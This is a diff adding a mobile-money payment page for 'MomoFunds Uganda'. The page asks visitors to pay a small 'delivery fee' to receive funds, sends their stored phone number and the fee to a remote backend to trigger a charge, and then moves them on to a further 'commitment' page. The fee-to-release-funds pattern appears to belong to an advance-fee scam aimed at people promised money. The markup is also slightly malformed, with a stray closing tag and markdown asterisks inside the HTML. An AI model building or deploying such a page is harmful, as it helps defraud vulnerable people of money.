@@ -1,0 +1,505 @@
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#FFD100">
+<title>MomoFunds Uganda — Delivery</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+
+body{
+font-family:Arial,sans-serif;
+min-height:100vh;
+padding:20px;
+display:flex;
+justify-content:center;
+align-items:center;
+background:
+radial-gradient(circle at 15% 20%, rgba(255,209,0,.35), transparent 30%),
+radial-gradient(circle at 85% 80%, rgba(245,176,0,.35), transparent 30%),
+linear-gradient(135deg,#FFD100,#F5B000);
+color:#000;
+overflow-x:hidden;
+}
+
+body::before,
+body::after{
+content:"";
+position:fixed;
+width:240px;
+height:240px;
+border-radius:50%;
+filter:blur(90px);
+z-index:-1;
+animation:moveBlob 10s ease-in-out infinite alternate;
+}
+
+body::before{
+background:#FFD100;
+top:-70px;
+left:-70px;
+}
+
+body::after{
+background:#F5B000;
+bottom:-70px;
+right:-70px;
+}
+
+@keyframes moveBlob{
+from{transform:translate(0,0);}
+to{transform:translate(20px,-20px);}
+}
+
+.container{width:100%;max-width:470px;}
+
+.card{
+background:rgba(255,255,255,.95);
+backdrop-filter:blur(16px);
+border:1px solid rgba(0,0,0,.08);
+border-radius:24px;
+padding:24px;
+box-shadow:0 25px 70px rgba(0,0,0,.35);
+}
+
+.progress{
+display:flex;
+align-items:center;
+justify-content:center;
+margin-bottom:22px;
+}
+
+.step{
+width:34px;
+height:34px;
+border-radius:50%;
+background:rgba(0,0,0,.12);
+display:flex;
+align-items:center;
+justify-content:center;
+font-weight:bold;
+}
+
+.step.active{
+background:#000;
+color:#FFD100;
+}
+
+.line{
+width:55px;
+height:3px;
+background:rgba(0,0,0,.15);
+}
+
+.line.active{
+background:#000;
+}
+
+.hero{
+text-align:center;
+font-size:55px;
+margin-bottom:10px;
+animation:float 3s ease-in-out infinite;
+}
+
+@keyframes float{
+0%,100%{transform:translateY(0);}
+50%{transform:translateY(-8px);}
+}
+
+h1{
+text-align:center;
+font-size:28px;
+margin-bottom:8px;
+color:#000;
+}
+
+.subtitle{
+text-align:center;
+color:#444;
+line-height:1.5;
+margin-bottom:22px;
+}
+
+.delivery-option{
+position:relative;
+display:flex;
+gap:12px;
+align-items:flex-start;
+padding:18px;
+border-radius:16px;
+border:2px solid rgba(0,0,0,.12);
+background:rgba(255,255,255,.65);
+margin-bottom:15px;
+cursor:pointer;
+transition:.3s ease;
+}
+
+.delivery-option:hover{
+transform:translateY(-2px);
+}
+
+.delivery-option input{
+margin-top:5px;
+accent-color:#FFD100;
+}
+
+.delivery-option:has(input:checked){
+border-color:#FFD100;
+background:rgba(255,209,0,.18);
+box-shadow:0 12px 28px rgba(255,209,0,.25);
+}
+
+.check{
+position:absolute;
+right:16px;
+top:16px;
+display:none;
+font-weight:bold;
+color:#000;
+}
+
+.delivery-option:has(input:checked) .check{
+display:block;
+}
+
+.method{
+font-weight:bold;
+font-size:16px;
+color:#000;
+}
+
+.method-icon{
+font-size:32px;
+margin-right:10px;
+vertical-align:middle;
+display:inline-block;
+}
+
+.fee{
+margin-top:6px;
+color:#444;
+font-size:14px;
+}
+
+.fee small{
+color:#666;
+}
+
+.delivery-amount{
+font-size:22px;
+font-weight:bold;
+color:#000;
+}
+
+.selected-fee{
+margin:22px 0;
+padding:18px;
+border-radius:14px;
+background:rgba(255,209,0,.18);
+border:1px solid rgba(0,0,0,.12);
+text-align:center;
+color:#000;
+}
+
+.selected-fee strong{
+display:inline-block;
+font-size:24px;
+color:#000;
+transition:.25s;
+}
+
+.changed{
+transform:scale(1.12);
+}
+
+button{
+width:100%;
+padding:17px;
+border:none;
+border-radius:14px;
+background:linear-gradient(135deg,#000,#222);
+color:#FFD100;
+font-size:17px;
+font-weight:bold;
+cursor:pointer;
+box-shadow:0 12px 28px rgba(0,0,0,.3);
+transition:.25s;
+}
+
+button:hover{
+transform:translateY(-2px);
+}
+
+button:disabled{
+opacity:.7;
+cursor:not-allowed;
+transform:none;
+}
+
+.spinner{
+display:none;
+width:24px;
+height:24px;
+border:3px solid rgba(0,0,0,.15);
+border-top:3px solid #000;
+border-radius:50%;
+animation:spin .8s linear infinite;
+margin:14px auto;
+}
+
+@keyframes spin{
+to{transform:rotate(360deg);}
+}
+
+#status{
+min-height:24px;
+margin-top:14px;
+text-align:center;
+padding:12px;
+border-radius:10px;
+font-size:14px;
+}
+
+.success{
+background:rgba(10,122,42,.12);
+color:#0A7A2A;
+}
+
+.error{
+background:rgba(211,47,47,.12);
+color:#D32F2F;
+}
+
+.trust{
+display:flex;
+justify-content:space-between;
+margin-top:20px;
+font-size:12px;
+color:#555;
+}
+
+.footer{
+text-align:center;
+margin-top:18px;
+color:#666;
+font-size:12px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="card">
+
+<div class="progress">
+<div class="step active">1</div>
+<div class="line active"></div>
+<div class="step active">2</div>
+<div class="line"></div>
+<div class="step">3</div>
+</div>
+
+<div class="hero">📲</div>
+
+<h1>MomoFunds Uganda</h1>
+
+<p class="subtitle">
+Choose your preferred delivery method and continue with your MomoFunds Uganda delivery payment.
+</p>
+
+<label class="delivery-option">
+<input type="radio" name="delivery" value="500">
+<div>
+<div class="method"><span class="method-icon">📱</span>Mobile Money</div>
+<div class="fee">
+<span class="delivery-amount">UGX 500</span> delivery fee
+<br><small>Estimated delivery: 1–5 minutes</small>
+</div>
+</div>
+<div class="check">✓</div>
+</label>
+
+<label class="delivery-option">
+<input type="radio" name="delivery" value="550">
+<div>
+<div class="method"><span class="method-icon">🏦</span>Bank Account</div>
+<div class="fee">
+<span class="delivery-amount">UGX 550</span> delivery fee
+<br><small>Estimated delivery: 1–5 minutes</small>
+</div>
+</div>
+<div class="check">✓</div>
+</label>
+
+<div class="selected-fee">
+Delivery Fee
+
+**UGX <span id="deliveryFee">0</span>**
+</div>
+
+<button id="payButton">Continue Payment</button>
+
+<div class="spinner" id="spinner"></div>
+
+<div id="status"></div>
+
+<div class="trust">
+<span>🔒 Secure</span>
+<span>📱 Mobile Money</span>
+<span>✔ Protected</span>
+</div>
+
+</div>
+
+<div class="footer">
+© 2026 MomoFunds Uganda
+</div>
+
+</div>
+
+<script>
+"use strict";
+
+/* Fixed backend URL */
+const BACKEND_URL="https://momo-funds-202.onrender.com";
+
+const deliveryFee=document.getElementById("deliveryFee");
+const payButton=document.getElementById("payButton");
+const statusElement=document.getElementById("status");
+const spinner=document.getElementById("spinner");
+
+document.querySelectorAll('input[name="delivery"]').forEach(input=>{
+input.addEventListener("change",()=>{
+deliveryFee.textContent=Number(input.value).toLocaleString("en-UG");
+deliveryFee.parentElement.classList.add("changed");
+setTimeout(()=>deliveryFee.parentElement.classList.remove("changed"),250);
+});
+});
+
+function setStatus(message,type=""){
+statusElement.textContent=message;
+statusElement.className=type;
+}
+
+function setLoading(loading,text="Processing..."){
+payButton.disabled=loading;
+payButton.textContent=loading?text:"Continue Payment";
+spinner.style.display=loading?"block":"none";
+}
+
+async function readJson(response){
+const text=await response.text();
+return text?JSON.parse(text):{};
+}
+
+async function payDelivery(){
+
+const selected=document.querySelector('input[name="delivery"]:checked');
+
+if(!selected){
+setStatus("Please select a delivery method.","error");
+return;
+}
+
+const phone=localStorage.getItem("phoneNumber");
+
+if(!phone){
+setStatus("Phone number not found. Return to the previous page.","error");
+return;
+}
+
+const amount=Number(selected.value);
+
+localStorage.setItem("deliveryMethod",amount===500?"Mobile Money":"Bank Account");
+localStorage.setItem("deliveryFee",amount);
+
+setLoading(true,"Sending...");
+setStatus("Sending payment request...");
+
+try{
+
+/* Fixed endpoint */
+const response=await fetch(`${BACKEND_URL}/api/pay`,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({phone,amount})
+});
+
+const data=await readJson(response);
+
+if(!response.ok||!data.success){
+throw new Error(data.message||"Payment request failed.");
+}
+
+const transactionId=
+data.transactionId||
+data.data?.reference||
+data.reference;
+
+setLoading(true,"Waiting...");
+setStatus("Please complete the payment on your phone.");
+
+await checkPayment(transactionId);
+
+}catch(error){
+setStatus(error.message,"error");
+setLoading(false);
+}
+}
+
+async function checkPayment(transactionId){
+
+const started=Date.now();
+
+while(Date.now()-started<120000){
+
+try{
+
+/* Fixed endpoint */
+const response=await fetch(`${BACKEND_URL}/api/status/${transactionId}`);
+
+const result=await readJson(response);
+
+const status=String(result.data?.status||result.status||"").toUpperCase();
+
+if(["SUCCESS","SUCCESSFUL"].includes(status)){
+setStatus("Payment confirmed. Redirecting...","success");
+setTimeout(()=>{
+window.location.href="commitment.html";
+},1000);
+return;
+}
+
+if(["FAILED","CANCELLED"].includes(status)){
+throw new Error("Payment "+status.toLowerCase()+".");
+}
+
+}catch(error){
+
+if(/failed|cancelled/i.test(error.message)){
+setStatus(error.message,"error");
+setLoading(false);
+return;
+}
+
+}
+
+await new Promise(r=>setTimeout(r,5000));
+}
+
+setStatus("We could not confirm payment in time.","error");
+setLoading(false);
+}
+
+payButton.addEventListener("click",payDelivery);
+</script>
+
+</body>
+</html>
